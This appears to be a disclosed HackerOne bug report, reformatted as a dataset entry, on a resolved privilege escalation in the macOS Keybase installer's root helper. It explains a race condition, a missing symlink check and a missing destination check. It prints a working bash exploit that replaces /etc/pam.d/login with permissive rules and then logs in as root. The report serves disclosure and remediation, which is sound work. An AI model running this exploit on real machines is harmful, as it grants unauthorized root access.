---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '473252'
original_report_id: '473252'
title: Privilege Escalation through Keybase Installer via Helper
weakness: Privilege Escalation
team_handle: keybase
created_at: '2018-12-30T05:48:58.619Z'
disclosed_at: '2019-01-30T18:59:22.293Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- privilege-escalation
---

# Privilege Escalation through Keybase Installer via Helper

## Metadata

- HackerOne Report ID: 473252
- Weakness: Privilege Escalation
- Program: keybase
- Disclosed At: 2019-01-30T18:59:22.293Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Keybase.app is bundled with the components installer named KeybaseInstaller.app. When `--install-app-bundle --source-path <src> --app-path <dst>` is given to installer, KBAppBundle.m checks if `<src>`  is properly codesigned, then copies it to `<dst>`.

First, there's two vulnerabilities in the source path validation: the check is racy, there's no symlink check.

## 1. Race condition

Since now the privileged helper (user=root) only accepts XPC request from 'admin' group, The path `/Application/Keybase.app` is often writable. So I think that race condition is possible between (1) and (2).

```objc
(1)   [self validate:sourcePath completion:^(NSError *error) {
        if (error) {
          completion(error);
          return;
        }

        DDLogInfo(@"Copying app bundle %@ to %@", sourcePath, destinationPath);
        NSDictionary *params = @{@"source": sourcePath, @"destination": destinationPath};
(2)     [self.helperTool.helper sendRequest:@"move" params:@[params] completion:^(NSError *error, id value) {
```

Successful exploitation will bypass the source check. I skipped writing PoC code since the race window is bit narrow.

## 2. No symbolic link check

If source path is symbolic link to /Application/Keybase.app, the check is bypassed. Attacker can make a symbolic link like this:

/tmp/A -> /tmp/B -> /Application/Keybase.app

Because the helper uses `NSFileManager::moveItemAtPath`, the symbolic link itself is copied. Copying /tmp/A causes destination path to be a symbolic link to /tmp/B, and further it can be modified to our file.

## 3. Missing check for destination

Second, there's no check for the destination path, which is passed from `--app-path` parameter. This makes the admin to overwrite any file or folder like `/etc`.

Combining 2, 3, user can overwrite any files to point the writable path.

```bash
#!/bin/bash

export APP=/Applications/Keybase.app
export INSTALLER=$APP/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase

export A=/tmp/_$RANDOM
export B=/tmp/_$RANDOM

# This script does `ln -sf /tmp/$R $DEST` in root permission
export DEST=/etc/pam.d/login

rm -rf $A $B
ln -s $APP $B
ln -s $B $A

$INSTALLER --run-mode=prod --app-path=$DEST --timeout=8 --install-app-bundle --source-path=$A --debug

# Now $DEST -> /tmp/$B (symlink)
# replace /tmp/$B to own contents
rm -rf /tmp/$B

cat > /tmp/$B <<EOF
# login: auth account password session
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       required       pam_permit.so
account    required       pam_permit.so
account    required       pam_permit.so
password   required       pam_permit.so
session    required       pam_permit.so
session    required       pam_permit.so
session    optional       pam_permit.so

EOF

# Now there's no pam-based check for /usr/bin/login
echo id | login root
```



## Patch

### Source path check

Maybe the app bundle can be compressed with proper signature, and checked in the way of the redirector check on [KBHelper.m line 260](https://github.com/keybase/client/blob/363e5462a0805db3fb5b5e31f9f5bc2d4d01964f/osx/Helper/KBHelper.m#L260), and extracted in the helper.

### Destination path check

I'm not sure how this can have additional restrictions, but maybe user alerts like those in `--install-helper` would be good. Alternatively, checking if `app_path == "/Applications/Keybase.app"` will work, too.

## Impact

The privilege can be escalated to 'root' from any user in 'admin' group (including the default user) and have access to keybase.Helper XPC service.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
